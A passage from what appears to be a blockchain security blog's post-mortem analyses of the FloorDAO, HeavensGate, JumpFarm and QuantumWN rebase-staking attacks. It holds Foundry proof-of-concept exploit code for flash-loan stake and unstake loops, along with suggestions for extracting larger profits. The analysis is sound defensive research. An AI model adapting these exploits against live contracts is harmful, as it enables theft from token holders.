in the next <code>rebase</code>, and they should be equal to the increase in sFloor tokens.</p> <p>But does this actually happen? Let's revisit how sFloor tokens are distributed.</p> <pre><code>uint256 balance = FLOOR.balanceOf(address(this));\nuint256 staked = sFLOOR.circulatingSupply();\nif (balance &lt;= staked.add(bounty)) {\n    epoch.distribute = 0;\n} else {\n    epoch.distribute = balance.sub(staked).sub(bounty);\n}\n</code></pre> <p>In the <code>rebase</code> function of the FloorStaking contract, it calculates the Floor token balance of the staking contract and the circulating supply of sFLOOR tokens. If the Floor balance is greater than the circulating sFloor tokens, the surplus should be the rewards to be distributed in the next epoch, and it calls the <code>rebase</code> function of the sFloor contract to distribute these rewards in the next <code>rebase</code>.</p> <p>This appears to be reasonable: if the quantity of Floor tokens in the staking contract exceeds the circulating supply of sFLOOR, the excess should indeed be newly minted Floor tokens to be distributed in the next epoch.</p> <p>However, when analyzing the attack, it becomes evident that the Floor token balance in the staking contract before the attack was significantly lower than the circulating sFloor tokens (approximately 20k), which is clearly unreasonable (imagine if all stakers decided to unstake at that moment, there would not be enough Floor tokens). Furthermore, during each <code>rebase</code>, only about 400 Floor tokens were minted, yet in the first <code>unstake</code> transaction, the attacker managed to obtain over 10k Floor tokens. These anomalies indicate that there is an issue in the contract's logic.</p> <pre><code>FLOOR.safeTransferFrom(msg.sender, address(this), _amount);\n_amount = _amount.add(rebase()); // add bounty if rebase occurred\nif (_claim &amp;&amp; warmupPeriod == 0) {\n    return _send(_to, _amount, _rebasing);\n} else {\n    ...\n}\n</code></pre> <p>The problem actually lies within the <code>stake</code> function, which first transfers the Floor tokens the user wants to stake to the staking contract and then calls the <code>rebase</code> function. This causes the <code>balance</code> calculated during rebase to include the amount that users have staked, resulting in data discrepancies.</p> <p></p> <p>Looking at the first rebase transaction, which directly called the <code>rebase</code> function to complete the rebase, this was the first epoch, so the <code>profit</code> was 0, and no tokens were issued.</p> <p></p> <p>Subsequently, the <code>distribute</code> was called, minting new Floor tokens (with a rate of 1000). Therefore, the subsequent calculation showed that the Floor reserves were higher than the circulating sFloor tokens, and the surplus became the rewards for the next epoch (<code>distribute/profit</code>) (1000), clearly the reserve of Floor tokens and circulation quantity of sFloor before mint are consistent.</p> <p>This process is correct because the rebase was not completed through the <code>stake</code> function.</p> <p></p> <p>However, the second rebase transaction was executed through the <code>stake</code> function, leading to a problem. In the <code>stake</code> function, it first called the <code>rebase</code> function of sFloor to distribute rewards from the previous epoch, and then, based on the growth rate, minted approximately 1020 new Floor tokens. Normally, the <code>balance-staked</code> should be approximately 1020. Floor reserves should only exceed the circulating sFloor tokens after minting new Floor tokens, and then it should be distributed in the next rebase, returning to balance. In other words, the <code>profit</code> during each rebase should be the Floor tokens minted in the previous rebase. At each epoch, the calculated Floor reserve should be higher than the sFloor's circulating supply, and the surplus should be distributed to the stakers in the next epoch.</p> <p></p> <p>However, due to the incorrect <code>transfer-&gt;rebase</code> order mentioned earlier, when calculating the rewards for the next epoch, the <code>balance</code> was augmented by the user's staked amount (which was 129 in this case). This resulted in an incorrect <code>profit</code> of 1149 (1020+129). While only 1020 Floor tokens were minted, the next epoch was set to distribute 1149 sFloor tokens, causing all stakers to receive more tokens after the next rebase than they should have.</p> <p>At this point, the circulating sFloor tokens exceeded the Floor reserves. If everyone tried to convert their sFloor to Floor, it wouldn't be possible. Since the new minted Floor tokens would only be distributed in the next epoch, the balance might suffice initially, but over time, the discrepancies between <code>balance</code> and <code>staked</code> would grow. Essentially, this created additional rewards out of thin air but was effectively overdrawing the staking contract's Floor token balance. This meant that the current distribution would be greater than the actual distribution/minted amount, and it could potentially lead to a situation where newly generated Floor tokens couldn't catch up with the circulating sFloor tokens for a long time (if directly calling <code>rebase</code>). However, if the incorrect <code>rebase</code> method (<code>stake</code> function) continued to be used, a significant amount of tokens could be injected to perpetuate the incorrect distribution/overdraft for profit.</p> <p>This attack resulted from the combination of the two aforementioned reasons: the lagging epoch allowed the attacker to perform multiple rebases in a single transaction, and the bug in the <code>stake</code> function, which involved an incorrect <code>transfer-&gt;rebase</code> order, caused a balance calculation discrepancy. This allowed the attacker to stake a large number of Floor tokens to inflate the next epoch's <code>profit</code> and thereby gain more profit.</p> <p>Other users who had staked before the attack could also profit (since a large number of sFloor tokens were distributed). However, the attacker immediately sold the Floor tokens after the attack, causing the Floor price to drop, indirectly causing losses to other Floor stakers.</p> <p>To address the lagging epoch issue, it would be advisable to set up bots to perform real-time rebases and update the epoch. Regarding the bug in the <code>stake</code> function, the correct approach should be to first call <code>rebase</code>, calculate the <code>profit</code> for the next epoch, and then transfer the Floor tokens.</p>"},{"location":"2023/230905_FloorDAO/#exploit","title":"Exploit","text":""},{"location":"2023/230905_FloorDAO/#reproduction","title":"Reproduction","text":"<p>Based on the above analysis, combined with the AttackTx, the exploit can be reproduced as follows:</p> <pre><code>function testExploit() external {\n    uint attackBlockNumber = 18068772;\n    // uint attackBlockNumber = 17068772;\n    vm.rollFork(attackBlockNumber);\n    (, uint256 number, uint256 end, ) = staking.epoch();\n    emit log_named_uint(\"Epoch number\", number);\n    emit log_named_uint(\"Epoch end\", end);\n    emit log_named_decimal_uint(\"floor balanceOf StakingPool\", floor.balanceOf(address(staking)), floor.decimals());\n    emit log_named_decimal_uint(\"floor balanceOf Pair\", floor.balanceOf(address(floor_weth)), floor.decimals());\n    emit log_named_decimal_uint(\"sFloor sirculatingSupply\", sFloor.circulatingSupply(), sFloor.decimals());\n\n    flashAmount = floor.balanceOf(address(floor_weth)) - 1;\n    floor_weth.flash(address(this), 0, flashAmount, \"\");\n\n    uint256 profitAmount = floor.balanceOf(address(this));\n    emit log_named_decimal_uint(\"floor balance after exploit\", profitAmount, floor.decimals());\n    floor_weth.swap(address(this), false, int256(profitAmount), uint160(0xfFfd8963EFd1fC6A506488495d951d5263988d25), \"\");\n    emit log_named_decimal_uint(\"weth balance after swap\", weth.balanceOf(address(this)), weth.decimals());\n}\n\nfunction uniswapV3FlashCallback(uint256 /*fee0*/ , uint256 fee1, bytes calldata) external {\n    uint i = 0;\n    while(i &lt; 17) {\n        uint balanceAttacker = floor.balanceOf(address(this));\n        uint balanceStaking = floor.balanceOf(address(staking));\n        uint circulatingSupply = sFloor.circulatingSupply();\n        if (balanceAttacker + balanceStaking &gt; circulatingSupply) {  // will produce profit in next epoch\n            floor.approve(address(staking), balanceAttacker);\n            staking.stake(address(this), balanceAttacker, false, true); // get gFloor\n            uint gFloorBalance = gFloor.balanceOf(address(this));\n            staking.unstake(address(this), gFloorBalance, true, false);\n            i += 1;\n        }\n    }\n    floor.transfer(msg.sender, flashAmount + fee1);\n}\n\nfunction uniswapV3SwapCallback(int256 /*amount0Delta*/, int256 amount1Delta, bytes calldata /*data*/) external {\n    int256 amount = amount1Delta;\n    if (amount &lt;= 0) {\n        amount = 0 - amount;\n    }\n    floor.transfer(msg.sender, uint256(amount));\n}\n</code></pre> <p>In the <code>flash</code> callback, the specific attack process is executed. Here, the attacker sets the <code>stake/unstake</code> loop to run 17 times, which can actually be increased to obtain more Floor tokens. However, if too many loops are executed, an error \"Treasury: insufficient reserves\" will occur during the <code>mint</code> operation.</p> <pre><code>/**\n* @notice mint new FLOOR using excess reserves\n* @param _recipient address\n* @param _amount uint256\n*/\nfunction mint(address _recipient, uint256 _amount) external override {\n    require(permissions[STATUS.REWARDMANAGER][msg.sender], notApproved);\n    require(_amount &lt;= excessReserves(), insufficientReserves);\n    FLOOR.mint(_recipient, _amount);\n    emit Minted(msg.sender, _recipient, _amount);\n}\n</code></pre> <p>This involves the <code>mint</code> function called in the Treasury contract after the distributor. We won't delve into this here.</p> <p>Finally, the attacker removes the flash loan fees and gains approximately 14.6k Floor tokens, which are then exchanged for about 40 WETH.</p> <p>For the <code>stake</code> operation, gFloor tokens are chosen, but sFloor tokens can also be chosen, as shown below:</p> <pre><code>function testsFloor() external {\n    uint attackBlockNumber = 18068772;\n    vm.rollFork(attackBlockNumber);\n\n    deal(address(floor), address(this), 152_000 * 10**9);\n\n    uint balanceAttacker = floor.balanceOf(address(this));\n    emit log_named_decimal_uint(\"Initial attacker floor\", balanceAttacker, floor.decimals());\n\n    floor.approve(address(staking), type(uint256).max);\n    sFloor.approve(address(staking), type(uint256).max);\n\n    staking.stake(address(this), balanceAttacker, true, true);  // get sFloor\n    uint sFloorBalance = sFloor.balanceOf(address(this));\n\n    // uint gFloorBalance = staking.wrap(address(this), sFloorBalance);\n    // staking.unstake(address(this), gFloorBalance, true, false);  // unstake by gFloor\n    staking.unstake(address(this), sFloorBalance, true, true);  // unstake by sFloor\n\n    balanceAttacker = floor.balanceOf(address(this));\n    emit log_named_decimal_uint(\"Finally attacker floor\", balanceAttacker, floor.decimals());\n    emit log_named_decimal_uint(\"Finally attacker sFloor\", sFloor.balanceOf(address(this)), sFloor.decimals());\n}\n</code></pre> <p>However, if sFloor tokens are used for the <code>unstake</code> operation, only the same amount of Floor tokens as previously staked can be withdrawn. The additional tokens remain staked in the contract as sFloor tokens because the increase in tokens occurs during the <code>rebase</code> within the <code>unstake</code> operation. These additional tokens can be withdrawn by using the <code>wrap</code> function to convert sFloor tokens to gFloor tokens. But if sFloor is converted to gFloor using <code>wrap</code>, Floor can be withdrawn entirely. This is because the <code>unstake</code> function recalculates the amount using <code>balanceFrom</code> after the <code>rebase</code> operation.</p> <p>Other users can also acquire more Floor tokens after the attack, as demonstrated in the following code:</p> <pre><code>function testOthers() external {\n    uint attackBlockNumber = 18068772;\n    vm.rollFork(attackBlockNumber);\n\n    deal(address(floor), address(0x1234), 100 * 10**9);\n    vm.startPrank(address(0x1234));\n    floor.approve(address(staking), type(uint256).max);\n    staking.stake(address(0x1234), 100 * 10**9, true, true);  // get sFloor\n    vm.stopPrank();\n\n    deal(address(floor), address(this), 100_000 * 10**9);\n\n    uint balanceAttacker = floor.balanceOf(address(this));\n    floor.approve(address(staking), type(uint256).max);\n    sFloor.approve(address(staking), type(uint256).max);\n    staking.stake(address(this), balanceAttacker, false, true);  // get sFloor\n    uint gFloorBalance = gFloor.balanceOf(address(this));\n    staking.unstake(address(this), gFloorBalance, true, false);\n    balanceAttacker = floor.balanceOf(address(this));\n    emit log_named_decimal_uint(\"Finally attacker Floor\", balanceAttacker, floor.decimals());\n    emit log_named_decimal_uint(\"Finally 0x1234 sFloor\", sFloor.balanceOf(address(0x1234)), sFloor.decimals()); // same increased rate\n}\n</code></pre> <p>The results show that other users who have staked normally also have more sFloor tokens.</p> <p>Furthermore, because the Floor protocol has not been very active for a long time, the epoch has been lagging behind for quite some time. Therefore, this attack could have been executed much earlier. Attempting the attack at block 17068772 would yield approximately 53 ETH.</p>"},{"location":"2023/230905_FloorDAO/#attack-flow","title":"Attack Flow","text":"<p>Analyzing the entire attack process of the attacker's address.</p> <p></p> <p>First, at around 7:08 AM on September 5th, the attacker initiated the attack by depositing approximately 1 ETH through Tornado Cash.</p> <p></p> <p>At 7:20 AM, the attacker created an <code>attackContract</code> for the attack. Five minutes later, they executed the contract, initiating the attack. Subsequently, the remaining ETH was transferred to the profitAddress.</p> <p></p> <p>The profitAddress gradually withdrew all ETH funds through Tornado Cash, and the entire attack process took less than an hour.</p>"},{"location":"2023/230905_FloorDAO/#misc","title":"Misc","text":""},{"location":"2023/230905_FloorDAO/#frontrunning-protection","title":"Frontrunning Protection","text":"<p>Upon simple decompilation of the attackContract, it appears that there were minimal measures in place to prevent frontrunning. The attack logic was essentially embedded in the code with only basic sender verification and the number of stake cycles as a call parameter. Additionally, profits are transferred to another address to avoid detection.</p> <p>The gas used in the transaction is not particularly high (although it is still considerably higher compared to other transactions within the block), indicating that the attacker may have been confident in using Flashbots for this attack. However, no relevant tags such as <code>MEV Transaction</code> or <code>Flashbots</code> were found on the etherscan page of the transaction, making it unclear what exactly happened.</p>"},{"location":"2023/230905_FloorDAO/#patch","title":"Patch","text":"<p>Following the attack, the FloorDAO team chose to reduce the liquidity of the Uniswap Floor-WETH pool. They also set the distributor to 0 in the transaction 0xcd97, disabling the rebase functionality of the staking contract. As a result, even if all Floor tokens were borrowed from the pool for staking, the <code>balance + transferAmount</code> during the <code>rebase</code> execution remained lower than the <code>staked</code> amount. This prevented any profits from being generated, effectively eliminating the possibility of further attacks.</p>"},{"location":"2023/230905_FloorDAO/#reference","title":"Reference","text":"<p>FloorDAO-docs-v1</p> <p>Floor Post Mortem &amp; Incident Summary</p> <p>olympus-contracts: Incorrect distribute amount when stake triggers rebase</p> <p>Introduce the Warm-up for Staking</p> <p>MagnetDAO_warmup_period_when_staking</p> <p>What is \"gons\" in Olympus Finance?</p> <p>Rebasing Tokens with Oracles and Liquidity Mining: The Ampleforth Approach as a Precursor to OlympusDAO</p>"},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/","title":"230905-HeavensGate-JumpFarm-QuantumWN","text":"<p>Following the FloorDAO attack incident, three other rebase token related projects fell victim to attacks on the same day. These attacks were all initiated by the same attacker. This article aims to provide a unified analysis of these attacks.</p> <p>Since a detailed analysis of the FloorDAO incident has already been conducted, this article will focus on the differences between these attacks and the FloorDAO incident.</p>"},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/#attack-transactions","title":"Attack Transactions","text":""},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/#heavensgate","title":"HeavensGate","text":"<p>HeavensGate was attacked twice.</p> <p></p> <p>The attacker profited approximately 6.45 ETH from AttackTx1.</p> <p></p> <p>The attacker profited approximately 1.4 ETH from AttackTx2.</p> <p>From the Invocation Flow perspective, these attacks were quite similar to the FloorDAO attack. They involved borrowing the corresponding tokens from Uniswap pairs and then executing a <code>stake-unstake</code> loop. The second attack transaction had a higher number of loop iterations, indicating that the attacker identified additional profit opportunities and launched a subsequent attack.</p>"},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/#jumpfarm","title":"JumpFarm","text":"<p>The attacker profited approximately 2.4 ETH from the JumpFarm attack.</p> <p></p> <p>From the Invocation Flow perspective, the JumpFarm attack differed slightly from the FloorDAO attack. Instead of borrowing tokens directly from Uniswap pairs, the attacker borrowed WETH from Balancer and then exchanged it for the corresponding tokens through WETH.</p>"},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/#quantumwm","title":"QuantumWM","text":"<p>The attacker profited approximately 0.6 ETH from the QuantumWM attack.</p> <p></p> <p>From the Invocation Flow perspective, the QuantumWM attack was similar to the JumpFarm attack. It also involved borrowing WETH from Balancer and then exchanging it for the corresponding tokens through WETH.</p>"},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/#vulnerability","title":"Vulnerability","text":"<p>Clearly, these attacks occurred due to the presence of lagging epoch.</p>"},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/#heavensgate_1","title":"HeavensGate","text":"<p>The <code>stake</code> function in the staking contract for HeavensGate is as follows:</p> <pre><code>/**\n* @notice stake HATE\n* @param _to address\n* @param _amount uint\n*/\nfunction stake(address _to, uint256 _amount) external {\n    HATE.transferFrom(msg.sender, address(this), _amount);\n    rebase();\n    sHATE.transfer(_to, _amount);\n}\n</code></pre> <p>Similar to Floor, the <code>stake</code> function in HeavensGate also has a logic vulnerability where the token transfer occurs before the rebase operation.</p>"},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/#jumpfarm_1","title":"JumpFarm","text":"<p>The <code>stake</code> function in the staking contract of JumpFarm is as follows:</p> <pre><code>/// @notice stake TOKEN\n/// @param _to address\n/// @param _amount uint\nfunction stake(address _to, uint256 _amount) external {\n    rebase();\n    TOKEN.transferFrom(msg.sender, address(this), _amount);\n    sTOKEN.transfer(_to, _amount);\n}\n</code></pre> <p>Unlike Floor and HeavensGate, JumpFarm's <code>stake</code> function first executes the <code>rebase</code> before performing the <code>transfer</code>. Therefore, there is no issue with this function.</p> <p>Hence, the reason for the attack's profitability should be the lagging epoch, allowing the attacker to continuously trigger the <code>rebase</code> after staking and mint additional tokens. With no bugs in the <code>stake</code> function, the rate of token distribution is quite high. According to its distributor contract, the rate of distribution with each <code>rebase</code> is 1%, which is 40 times higher than Floor's rate of 0.025%.</p> <p>Therefore, the attacker only needs to continuously call the <code>rebase</code> function after staking. The repeated <code>stake-unstake</code> loop may simply be an imitation of the FloorDAO attack, wasting gas.</p>"},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/#quantumwm_1","title":"QuantumWM","text":"<p>The <code>stake</code> function in the staking contract of QuantumWM is similar to JumpFarm's:</p> <pre><code>/// @notice stake QWA\n/// @param _to address\n/// @param _amount uint\nfunction stake(address _to, uint256 _amount) external {\n    rebase();\n    QWA.transferFrom(msg.sender, address(this), _amount);\n    sQWA.transfer(_to, _amount);\n}\n</code></pre> <p>Similar to JumpFarm, the reason for profitability here is also the lagging epoch. With no bugs in the <code>stake</code> function, the rate of token distribution is also 1% with each <code>rebase</code>, as per its distributor contract, which is relatively high.</p>"},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/#exploit","title":"Exploit","text":""},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/#reproduction","title":"Reproduction","text":""},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/#heavensgate_2","title":"HeavensGate","text":"<p>The following exploit can be reproduced based on two AttackTx:</p> <pre><code>function testHeavensGate1() external {\n    heavensGateAttack(18069527);\n}\n\nfunction testHeavensGate2() external {\n    heavensGateAttack(18071198);\n}\n\nfunction heavensGateAttack(uint256 attackBlockNumber) internal {\n    vm.rollFork(attackBlockNumber);\n    (, uint256 epochNumber, uint256 epochEnd, ) = hateStaking.epoch();\n    emit log_named_uint(\"Epoch number\", epochNumber);\n    emit log_named_uint(\"Epoch end\", epochEnd);\n    emit log_named_decimal_uint(\"hate balanceOf StakingPool\", hate.balanceOf(address(hateStaking)), hate.decimals());\n\n    hate.approve(address(hateStaking), type(uint256).max);\n    sHate.approve(address(hateStaking), type(uint256).max);\n    if (attackBlockNumber == 18069527) {\n        flashAmount =  hate.balanceOf(address(hate_weth)) * 9/10;\n        hate_weth.swap(flashAmount, 0, address(this), \"HeavensGate1\");\n    } else {\n        flashAmount =  hate.balanceOf(address(hate_weth)) * 7/10;\n        hate_weth.swap(flashAmount, 0, address(this), \"HeavensGate2\");\n    }\n\n    uint256 profitAmount = hate.balanceOf(address(this));\n    emit log_named_decimal_uint(\"hate balance after exploit\", profitAmount, hate.decimals());\n    hate.approve(address(router), type(uint256).max);\n    address[] memory path = new address[](2);\n    path[0] = address(hate);\n    path[1] = address(weth);\n    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(profitAmount, 0, path, address(this), block.timestamp);\n    emit log_named_decimal_uint(\"weth balance after swap\", weth.balanceOf(address(this)), weth.decimals());    \n}\n\nfunction uniswapV2Call(address /*sender*/, uint amount0, uint /*amount1*/, bytes calldata data) public {\n    uint256 number = 0;\n    uint i = 0;\n    if (keccak256(data) == keccak256(\"HeavensGate1\") || keccak256(data) == keccak256(\"HeavensGate2\")) {\n        if (keccak256(data) == keccak256(\"HeavensGate1\")) number = 3; else number = 0x1e;\n        emit log_named_decimal_uint(\"hate balanceOf loaned\", hate.balanceOf(address(this)), hate.decimals());\n        while(i &lt; number) {\n            uint balanceAttacker = hate.balanceOf(address(this));\n            hateStaking.stake(address(this), balanceAttacker);\n            uint sTokenBalance = sHate.balanceOf(address(this));\n            hateStaking.unstake(address(this), sTokenBalance, true);\n            i += 1;\n        }\n        uint fee = (amount0 * 3)/997+1;\n        hate.transfer(msg.sender, flashAmount + fee);\n    }\n    else {\n        number = 20;\n        while(i &lt; number) {\n            uint balanceAttacker = jump.balanceOf(address(this));\n            jumpStaking.stake(address(this), balanceAttacker);\n            uint sTokenBalance = sHate.balanceOf(address(this));\n            jumpStaking.unstake(address(this), sTokenBalance, true);\n            i += 1;\n        }\n        uint fee = (amount0 * 3)/997+1;\n        jump.transfer(msg.sender, flashAmount + fee);\n    }\n}\n</code></pre> <p>It is important to note that before the first attack, the Uniswap pair contains approximately 907k Hate tokens, and the staking contract holds about 577k Hate tokens. The staking contract itself has significantly fewer tokens than in the pair (the opposite is true for the FloorDAO incident). Therefore, by exploiting a logic vulnerability in the <code>stake</code> function, a significant profit can be quickly generated, depleting all of the staking contract's tokens. The first attack involved only three cycles of <code>stake-unstake</code>, resulting in the withdrawal of most of the Hate tokens from the staking contract. After the attack, the staking contract was left with only 66k Hate tokens, and the attacker gained 570k (the excess was newly minted during this process). </p> <p>(Here, looping three times and lending out only 90% of the tokens from the pool are likely parameters obtained through testing by the attacker. Excessive looping or staking too many tokens may result in an insufficient balance in the staking contract, leading to an <code>Insufficient HATE balance in contract</code> error.)</p> <p>Subsequently, the attacker launched another attack. However, after this attack, the attacker gained approximately 22k Hate tokens in profit, and the staking contract's balance increased to around 580k tokens (even more than before the first attack).</p> <p>Observing the second AttackTx, it can be seen that many <code>rebase</code> operations did not generate profit throughout the process. This indicates that the total token amount received during <code>stake</code> plus the newly minted tokens did not exceed the circulating supply of sHate. Thus, the subsequent token distribution occurred gradually with each <code>rebase</code>.</p> <p>Examining the distributor reveals that the distribution amount during each <code>rebase</code> is 0.5%, which is 20 times that of the Floor.</p> <p>In summary, the attacker's two attacks on HeavensGate were relatively crude, especially the second one. In fact, they could have obtained more Hate tokens. Due to the high token distribution rate and the large number of Hate tokens in the Uniswap pair, it would have been possible to first continuously perform <code>rebase</code> until a sufficient number of tokens were minted, and then exploit the <code>stake</code> function's bug to deplete the staking contract's tokens.</p>"},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/#jumpfarm-quantumwn","title":"JumpFarm &amp; QuantumWN","text":"<p>The attack vectors for these two projects are the same and can be reproduced based on AttackTx:</p> <pre><code>function testJumpFarm() external {\n    uint256 attackBlockNumber = 18070346;\n    vm.rollFork(attackBlockNumber); \n\n    jump.approve(address(jumpStaking), type(uint256).max);\n    sJump.approve(address(jumpStaking), type(uint256).max);\n\n    address[] memory token = new address[](1);\n    token[0] = address(weth);\n    uint256[] memory amount = new uint256[](1);\n    amount[0] = 15 * 1 ether;\n    balancer.flashLoan(address(this), token, amount, \"JumpFarm\");\n\n    // weth.withdraw(weth.balanceOf(address(this)));\n    emit log_named_decimal_uint(\"eth balance after exploit\", weth.balanceOf(address(this)), 18);\n}\n\nfunction testQuantumWN() external {\n    uint256 attackBlockNumber = 18070346;\n    vm.rollFork(attackBlockNumber); \n\n    fumog.approve(address(QWAStaking), type(uint256).max);\n    sFumog.approve(address(QWAStaking), type(uint256).max);\n\n    address[] memory token = new address[](1);\n    token[0] = address(weth);\n    uint256[] memory amount = new uint256[](1);\n    amount[0] = 5 * 1 ether;\n    balancer.flashLoan(address(this), token, amount, \"QuantumWN\");\n\n    // weth.withdraw(weth.balanceOf(address(this)));\n    emit log_named_decimal_uint(\"eth balance after exploit\", weth.balanceOf(address(this)), 18);\n}\n\nfunction receiveFlashLoan(address[] memory /*tokens*/, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) external {\n    IERC20 targetToken;\n    IERC20 targetsToken;\n    StakingPool stakingPool;\n    uint256 number;\n    if (keccak256(userData) == keccak256(\"JumpFarm\")) {\n        targetToken = jump;\n        targetsToken = sJump; \n        stakingPool = jumpStaking;\n        number = 0x28;\n    } else if (keccak256(userData) == keccak256(\"QuantumWN\")) {\n        targetToken = fumog;\n        targetsToken = sFumog;\n        stakingPool = QWAStaking;\n        number = 0x1e;\n    }\n    weth.approve(address(router), type(uint256).max);\n    address[] memory path = new address[](2);\n    path[0] = address(weth);\n    path[1] = address(targetToken);\n    router.swapExactTokensForTokens(amounts[0], 0, path, address(this), block.timestamp);\n    uint8 i = 0;\n    while(i &lt; number) {\n        i += 1;\n        uint256 amountToken = targetToken.balanceOf(address(this));\n        stakingPool.stake(address(this), amountToken);\n        uint256 amountsToken = targetsToken.balanceOf(address(this));\n        stakingPool.unstake(address(this), amountsToken, true);\n    }\n    // uint256 amountToken = targetToken.balanceOf(address(this));\n    // stakingPool.stake(address(this), amountToken);\n    // while(i &lt; number) {\n    //     i += 1;\n    //     stakingPool.rebase();\n    // }\n    // uint256 amountsToken = targetsToken.balanceOf(address(this));\n    // stakingPool.unstake(address(this), amountsToken, true);\n\n    targetToken.approve(address(router), type(uint256).max);\n    uint amount = targetToken.balanceOf(address(this));\n    emit log_named_decimal_uint(\"target token balance after exploit\", amount, targetToken.decimals());\n\n    path[0] = address(targetToken);\n    path[1] = address(weth);\n    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);\n    weth.transfer(address(balancer), amounts[0]+feeAmounts[0]);\n}\n</code></pre> <p>The attack vectors on both projects were the same, borrowing ETH from Balancer to purchase corresponding tokens for staking, then engaging in a <code>stake-unstake</code> loop. As mentioned earlier, since there were no bugs in the <code>stake</code> function, one could continuously <code>rebase</code> after staking, which should reduce gas costs. Additionally, every time the staked tokens were taken out through <code>unstake</code>, making it impossible to obtain the additional distribution rewards of rebase in the next <code>stake</code>. Therefore, staking only once and continuously rebasing could also yield more tokens.</p> <p>The results of the scripts confirm that, with the same number of iterations, significantly lower gas costs can be achieved, and the final profits are approximately 3.3 ETH and 1.5 ETH, which is considerably higher than the original attacks' gains of 2.4 ETH and 0.6 ETH, respectively.</p> <p>The reason for borrowing ETH and purchasing the corresponding tokens instead of directly performing a flash loan swap from the Uniswap pair is due to the <code>_transfer</code> function of these tokens.</p> <p>Taking JumpFarm's jump token as an example, its <code>_transfer</code> function contains the following code:</p> <pre><code>if (\n    canSwap &amp;&amp;\n    swapEnabled &amp;&amp;\n    !swapping &amp;&amp;\n    !automatedMarketMakerPairs[from] &amp;&amp;\n    !_isExcludedFromFees[from] &amp;&amp;\n    !_isExcludedFromFees[to]\n) {\n    swapping = true;\n\n    swapBack();\n\n    swapping = false;\n}\n</code></pre> <p>The <code>swapBack</code> related code is as follows:</p> <pre><code>/// @dev INTERNAL function to swap `tokenAmount` for ETH\n/// @dev Invoked in `swapBack()`\nfunction swapTokensForEth(uint256 tokenAmount) internal {\n    // generate the uniswap pair path of token -&gt; weth\n    address[] memory path = new address[](2);\n    path[0] = address(this);\n    path[1] = uniswapV2Router.WETH();\n\n    _approve(address(this), address(uniswapV2Router), tokenAmount);\n\n    // make the swap\n    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n        tokenAmount,\n        0, // accept any amount of ETH\n        path,\n        address(this),\n        block.timestamp\n    );\n}\n\n/// @dev INTERNAL function to add `tokenAmount` and `ethAmount` to LP\n/// @dev Invoked in `swapBack()`\nfunction addLiquidity(uint256 tokenAmount, uint256 ethAmount) internal {\n    // approve token transfer to cover all possible scenarios\n    _approve(address(this), address(uniswapV2Router), tokenAmount);\n\n    // add the liquidity\n    uniswapV2Router.addLiquidityETH{value: ethAmount}(\n        address(this),\n        tokenAmount,\n        0, // slippage is unavoidable\n        0, // slippage is unavoidable\n        treasury,\n        block.timestamp\n    );\n}\n\n/// @dev INTERNAL function to transfer fees properly\n/// @dev Invoked in `_transfer()`\nfunction swapBack() internal {\n    uint256 contractBalance = balanceOf(address(this));\n    uint256 totalTokensToSwap = tokensForLiquidity +\n        tokensForBacking +\n        tokensForTeam;\n    bool success;\n\n    if (contractBalance == 0 || totalTokensToSwap == 0) {\n        return;\n    }\n\n    if (contractBalance &gt; swapTokensAtAmount() * 20) {\n        contractBalance = swapTokensAtAmount() * 20;\n    }\n\n    // Halve the amount of liquidity tokens\n    uint256 liquidityTokens = (contractBalance * tokensForLiquidity) /\n        totalTokensToSwap /\n        2;\n    uint256 amountToSwapForETH = contractBalance - liquidityTokens;\n\n    uint256 initialETHBalance = address(this).balance;\n\n    swapTokensForEth(amountToSwapForETH);\n\n    uint256 ethBalance = address(this).balance - initialETHBalance;\n\n    uint256 ethForBacking = (ethBalance * tokensForBacking) /\n        totalTokensToSwap -\n        (tokensForLiquidity / 2);\n\n    uint256 ethForTeam = (ethBalance * tokensForTeam) /\n        totalTokensToSwap -\n        (tokensForLiquidity / 2);\n\n    uint256 ethForLiquidity = ethBalance - ethForBacking - ethForTeam;\n\n    tokensForLiquidity = 0;\n    tokensForBacking = 0;\n    tokensForTeam = 0;\n\n    (success, ) = address(teamWallet).call{value: ethForTeam}(\"\");\n\n    if (liquidityTokens &gt; 0 &amp;&amp; ethForLiquidity &gt; 0) {\n        addLiquidity(liquidityTokens, ethForLiquidity);\n        emit SwapAndLiquify(\n            amountToSwapForETH,\n            ethForLiquidity,\n            tokensForLiquidity\n        );\n    }\n\n    uint256 _balance = address(this).balance;\n    IWETH(WETH).deposit{value: _balance}();\n    IERC20(WETH).transfer(treasury, _balance);\n}\n</code></pre> <p>When tokens are transferred, if the contract's token reserves exceed a certain threshold, a portion of the tokens will be exchanged for ETH, which will then be used to provide liquidity.</p> <p>Therefore, if a direct swap is made from the pair and the pair attempts to transfer tokens to the attack contract, it will trigger the UniswapPair's reentrant lock protection when attempting to swap tokens for ETH, resulting in a revert. (In the case of using Foundry for testing, the error is <code>ds-math-sub-underflow</code>, but inspecting the trace reveals that it indeed terminates execution during the second call to <code>swap</code>.)</p>"},{"location":"2023/230905_HeavensGate_JumpFarm_QuantumWN/#attack-flow","title":"Attack Flow","text":"<p>Let's analyze the entire attack flow of the attacker's address.</p> <p></p> <p>Before September 5th, the attacker had launched two previous attacks, one involving BTC20 and the other related to DDA, which we will not discuss here.</p> <p></p> <p>At approximately 10:00 AM on September 5th, the attacker created a contract to attack HeavensGate and promptly initiated the attack.</p> <p>Less than three hours later, they created contracts to attack JumpFarm and QuantumWM, making two calls to execute these attacks.</p> <p>After about another 3 hours, the attacker likely found HeavensGate still profitable and repeated the process by creating contracts and launching another attack.</p> <p>Finally, on the following day, the attacker used Tornado Cash and ChangeNOW to withdraw all their profits.</p> <p>It's worth noting that the attack on FloorDAO 